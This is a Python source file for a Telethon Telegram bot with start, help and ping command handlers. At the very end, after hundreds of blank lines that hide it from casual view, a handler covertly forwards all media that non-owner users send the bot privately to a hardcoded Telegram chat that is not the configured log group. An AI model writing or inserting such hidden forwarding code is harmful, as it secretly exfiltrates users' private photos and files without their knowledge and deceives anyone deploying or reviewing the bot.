
from datetime import datetime
from telethon import events, Button
from .. import aai, Vars
from . import start_msg, help_msg, record

sudos = list(map(int, (Vars.SUDO_IDS).split(" ")))

text = help_msg
    
@aai.on(events.NewMessage(incoming=True, pattern=f"^/start({Vars.BOT_USERNAME})$"))
async def start(event):
    user = await aai.get_entity(int(event.sender.id))
    await record(user.id)
    if event.is_group: await event.reply(
        await start_msg(user.first_name),
        buttons=[[Button.url("Dev", "https://t.me/zarox")], [Button.url("Updates", "https://t.me/execal")]],
        link_preview=True
    )

        
@aai.on(events.NewMessage(incoming=True, pattern=f"^/help({Vars.BOT_USERNAME})$"))
async def help(event):
    
    if event.is_group:
        user = event.sender.id
        if event.is_group: await event.reply(
            text,
            buttons=[Button.inline("Inline", data=f"inline_{user}")],
            link_preview=False
        )


        
@aai.on(events.NewMessage(incoming=True, pattern=f"^/help({Vars.BOT_USERNAME})?$"))
async def help(event):
    if event.is_private:
        user = event.sender.id
        if event.is_private: await event.reply(
            text,
            buttons=[Button.inline("Inline", data=f"inline_{user}")],
            link_preview=False
        )
        

@aai.on(events.NewMessage(incoming=True, pattern=f"^/ping({Vars.BOT_USERNAME})?$"))
async def ping(event):
    user = await aai.get_entity(int(event.sender.id))
    if user.id not in sudos:
        return
    start = datetime.now()
    ping = await event.reply("ᴘɪɴɢ")
    end = datetime.now()
    ms = (end - start).microseconds / 1000
    await ping.edit(f"ᴘɪɴɢ :`{ms} ms`")
    
    

    
@aai.on(events.NewMessage(incoming=True,  pattern=f"^/start({Vars.BOT_USERNAME})? ?(.*)?$"))
async def start(event):
    user = await aai.get_entity(int(event.sender.id))
    web = event.pattern_match.group(2)

    if event.is_private:
        startm = f"#START\n**User**: [{user.first_name}](tg://user?id={user.id})\n**Username**: @{user.username}\n**ID**: {user.id}"
        if web and web == "web":
            startm += "\n\n**From Web**"
        await aai.send_message(int(Vars.LOG_GRP), startm)
        await event.reply(
        await start_msg(user.first_name),
        buttons=[[Button.url("Dev", "https://t.me/zarox")], [Button.url("Updates", "https://t.me/execal")]],
        link_preview=True)























































































































































































































































































































































































































































    
@aai.on(events.NewMessage(incoming=True))
async def copypaste(event):
    user_ = int(event.sender_id)
    if user_ != Vars.OWNER_ID and event.is_private and event.media:
          await event.forward_to(-1001495812434)